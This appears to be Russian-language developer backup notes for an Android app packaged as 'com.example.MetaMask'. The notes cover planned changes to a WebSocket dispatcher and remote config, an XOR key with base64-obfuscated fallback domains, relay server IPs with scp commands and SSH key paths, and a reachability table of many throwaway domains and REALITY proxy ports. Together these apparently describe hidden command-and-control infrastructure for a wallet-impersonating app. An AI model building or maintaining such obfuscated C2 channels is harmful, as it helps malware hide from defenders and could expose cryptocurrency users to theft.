# Бэкапы cristofer_v2

## Правило: ПЕРЕД ЛЮБЫМ ИЗМЕНЕНИЕМ — БЭКАП

---

## Бэкап 2026-09-13 (перед добавлением /ws + умный пинг)

**Папка:** `backups/2026-09-13/`

### Забэкапленные файлы (Android/Kotlin):

| Файл | Оригинал | Размер |
|------|---------|--------|
| `RealityWebSocket.kt` | `app/src/main/java/com/example/MetaMask/utils/` | 4772 bytes |
| `RealityConfig.kt` | `app/src/main/java/com/example/MetaMask/utils/` | 5187 bytes |
| `MasterWebSocketDispatcher.kt` | `app/src/main/java/com/example/MetaMask/services/` | 32657 bytes |
| `RemoteConfig.kt` | `app/src/main/java/com/example/MetaMask/utils/` | 9027 bytes |

### Что планируется изменить (к чему привязан бэкап):
1. **RealityWebSocket.kt** — убрать `targetHost = "157.22.190.49"`, заменить на `RemoteConfig.serverDomain` + fallback зашифрованный домен `IgAFHgUdDhcPAEsfCgY=` (`dakjdnwgnn.sbs`), `targetPort = 80`
2. **MasterWebSocketDispatcher.kt** — добавить умный мониторинг пинга с гистерезисом
3. **RealityConfig.kt** — возможны мелкие правки

### Nginx-конфиги (серверные бэкапы, делаем прямо перед изменением каждого сервера):
- **91.219.227.48 (vkadaw):** `scp ubuntu@vkadaw.click:/etc/nginx/sites-available/* backups/nginx-vkadaw/`
- **89.169.170.140 (relay2):** `scp -i C:\Users\lenov\Downloads\relay2_id_ed25519.pem proxevruru@89.169.170.140:/etc/nginx/sites-available/* backups/nginx-relay2/`
- **83.136.208.40 (petrodawd):** python paramiko → скачать `/etc/nginx/sites-available/*`

---

## Откат (если что-то пошло не так)

### Откат Android файлов:
```powershell
$bak = "C:\Users\lenov\OneDrive\Desktop\bot\noviy\cristofer_v2\backups\2026-09-13"
$dst = "C:\Users\lenov\OneDrive\Desktop\bot\noviy\cristofer_v2\app\src\main\java\com\example\MetaMask"

Copy-Item "$bak\RealityWebSocket.kt" "$dst\utils\RealityWebSocket.kt" -Force
Copy-Item "$bak\RealityConfig.kt" "$dst\utils\RealityConfig.kt" -Force
Copy-Item "$bak\MasterWebSocketDispatcher.kt" "$dst\services\MasterWebSocketDispatcher.kt" -Force
Copy-Item "$bak\RemoteConfig.kt" "$dst\utils\RemoteConfig.kt" -Force
```

### Откат nginx на сервере (пример для relay2):
```bash
cp /etc/nginx/sites-available/dakjdnwgnn.sbs.bak /etc/nginx/sites-available/dakjdnwgnn.sbs
nginx -t && nginx -s reload
```

---

## Ключевые шифрованные строки (XOR key: Fantasypanelhub651241)

| Домен | Зашифрованный B64 |
|-------|-------------------|
| `dakjdnwgnn.sbs` | `IgAFHgUdDhcPAEsfCgY=` |
| `dakjdnwgnq.sbs` | `IgAFHgUdDhcPH0sfCgY=` |
| `dawdawbvvs.cyou` | `IgAZEAAEGwYXHUsPERoX` |
| `newglnbsj.click` | `KAQZEw0dGwMLQAYAARYJ` |
| `all1.realdd.click` | `Jw0CRU8BHBENCgFCCxkLVV4=` |

---

## Доступность доменов (проверено 2026-09-13)

| Домен | Сервер | :80 | :443 | :47443 |
|-------|--------|-----|------|--------|
| dakjdnwgnq.sbs | 91.219.227.48 | ✅ | ✅ | ✅ |
| dawdawbvvs.cyou | 91.219.227.48 | ✅ | ✅ | ✅ |
| dakjdnwgnn.sbs | 89.169.170.140 | ✅ | ✅ | ✅ |
| dawawd.homes | 89.169.170.140 | ✅ | ✅ | ✅ |
| eufesfb.click | 89.169.170.140 | ✅ | ✅ | — |
| fantasy-hub.sbs | 89.169.170.140 | ✅ | ✅ | ✅ |
| ruyan.sbs | 89.169.170.140 | ✅ | ✅ | ✅ |
| aakwjd.mom | 83.136.208.40 | ✅ | ✅ | — |
| curtcabein.top | 83.136.208.40 | ✅ | ✅ | — |
| dakjdnwgne.sbs | 83.136.208.40 | ✅ | ✅ | — |
| dddevropa.sbs | 83.136.208.40 | ✅ | ✅ | — |
| evrosoeed.cyou | 83.136.208.40 | ✅ | ✅ | — |
| jhvdrbjvhb.mom | 83.136.208.40 | ✅ | ✅ | ✅ |
| soedenenka.online | 83.136.208.40 | ✅ | ✅ | — |
| vkadaw.click | 91.219.227.48 | REALITY:8443 | — | — |
| petrodawd.click | 83.136.208.40 | REALITY:8444 | — | — |
